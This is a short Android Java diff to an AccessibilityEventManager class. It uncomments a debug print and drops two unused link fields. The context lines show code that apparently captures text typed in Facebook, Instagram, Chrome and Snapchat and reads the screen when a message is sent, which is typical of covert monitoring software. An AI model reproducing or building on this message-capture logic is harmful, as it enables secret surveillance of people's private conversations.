@@ -29,9 +29,6 @@ public class AccessibilityEventManager {
     private static String currentTypedText = "";
     private static String previousText = "";
 
-    private static String currentLink = "";
-    private static String previousLink = "";
-
     private static StringBuilder actualTextBuilder = new StringBuilder();
     private static ArrayList<String> extraOnScreenText = new ArrayList<>();
     private static int mDebugDepth = 0;
@@ -81,7 +78,7 @@ public class AccessibilityEventManager {
                         Class className = Class.forName(eventClassName);
 
                         if (EditText.class.isAssignableFrom(className)) {
-                            //System.out.println("[sproc32.MAS]: Found text change event from fb, insta, chrome or snap. currentTypedText = " + currentTypedText + " | previousText = " + previousText);
+                            System.out.println("[sproc32.MAS]: Found text change event from fb, insta, chrome or snap. currentTypedText = " + currentTypedText + " | previousText = " + previousText);
 
                             if (eventPackageName.equals(Constants.PACKAGE_NAME_INSTAGRAM) && currentTypedText.equals(Constants.INSTAGRAM_CONVERSATION_FIELD_DEFAULT_TEXT)) { //if text becomes "Messages....", then a message has been cleared, ie. sent
                                 readAllScreenCharacters(rootWindow);
